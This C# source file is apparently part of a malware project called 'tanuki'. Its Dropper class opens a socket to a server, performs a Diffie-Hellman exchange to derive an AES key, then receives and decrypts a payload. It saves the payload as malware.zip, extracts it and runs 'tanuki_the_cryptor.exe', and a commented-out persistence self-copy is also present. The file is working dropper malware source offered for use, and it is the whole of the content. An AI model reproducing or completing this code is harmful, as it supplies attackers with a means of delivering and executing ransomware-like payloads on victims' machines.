using Microsoft.Win32;
using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using Packets;
using System.Text.Json;
using System.Numerics;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Runtime.InteropServices.ComTypes;
using System.IO.Compression;

namespace tanuki_the_first
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("tanuki!!!!!!!!");

            Persistence persistence = new Persistence();    
            //persistence.SelfCopy();

            Dropper dropper = new Dropper();
            dropper.Execute();

            Console.ReadLine();
        }
    }

    class Dropper
    {
        private BigInteger dh_key;
        private BigInteger aes_key;

        public void Execute()
        {
            Random rand = new Random();
            BigInteger x;
            BigInteger gx;
            try
            {
                Communication comm = new Communication("localhost", 65432);

                Packets.Request.StartInteraction start = new Packets.Request.StartInteraction() { Operation = "keyExchangeGen" };
                string start_Json = JsonSerializer.Serialize<Packets.Request.StartInteraction>(start);
                byte[] start_bytes = Encoding.ASCII.GetBytes(start_Json.ToString());
                Console.WriteLine("JSON: " + start_Json);

                comm.Start();

                comm.SendMessage(start_bytes);
                (byte[] serverHalf_byte, int bytesRead) = comm.RecvMessage(1024);

                string serverHalf = Encoding.ASCII.GetString(serverHalf_byte, 0, bytesRead);
                serverHalf = serverHalf.Replace("'", "\"");
                Console.WriteLine("Received: " + serverHalf);

                Packets.Reply.KeyExchange response = JsonSerializer.Deserialize<Packets.Reply.KeyExchange>(serverHalf);
                (x, gx, this.dh_key) = Cryptography.GenerateDHValues_X_GX_KEY(BigInteger.Parse(response.Prime), BigInteger.Parse(response.Generator), BigInteger.Parse(response.Gx_server));

                Packets.Request.ParametersExchange parameters = new Packets.Request.ParametersExchange() { Operation = "keyExchangeAns", Gx_client = gx.ToString() };
                string parameters_Json = JsonSerializer.Serialize<Packets.Request.ParametersExchange>(parameters);
                byte[] parameters_bytes = Encoding.ASCII.GetBytes(parameters_Json.ToString());

                comm.SendMessage(parameters_bytes);

                Console.WriteLine("DH Key int: " + dh_key.ToString());
                Console.WriteLine("DH Key hex: " + dh_key.ToString("X"));

                aes_key = new BigInteger(Cryptography.ComputeAESKey(dh_key.ToString("X")));
                
                Console.WriteLine("AES Key hex: " + ByteArrayToString(this.aes_key.ToByteArray()));

                byte[] hash_bytes = null;
                (hash_bytes, bytesRead) = comm.RecvMessage(4096);

                string hash = Encoding.ASCII.GetString(hash_bytes, 0, bytesRead);
                hash = hash.Replace("'", "\"");
                Console.WriteLine("Received: " + hash);

                Packets.Reply.ExeSend resp = JsonSerializer.Deserialize<Packets.Reply.ExeSend>(hash);


                //---------------------------------//

                byte[] binary_data;
                (binary_data, bytesRead) = comm.RecvBinary(158_901_184);
                
                byte[] zip = new byte[bytesRead];
                Array.Copy(binary_data, zip, bytesRead);
                Console.WriteLine("Received byte len: " + zip.Length);

                binary_data = Cryptography.AESDecrypt(zip, aes_key.ToByteArray());

                using (FileStream file = new FileStream("malware.zip", FileMode.Create, FileAccess.Write))
                {
                    file.Write(binary_data, 0, bytesRead);
                }

                ZipFile.ExtractToDirectory("malware.zip", ".\\");

                Exec.ExecProgram(".\\malware\\tanuki_the_cryptor.exe");

                Console.WriteLine("Binary file received and saved.");
            }
            catch(Exception ex)
            {
                Console.WriteLine("Could not exchange key with server: " + ex.Message);
            }
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

    }
    
}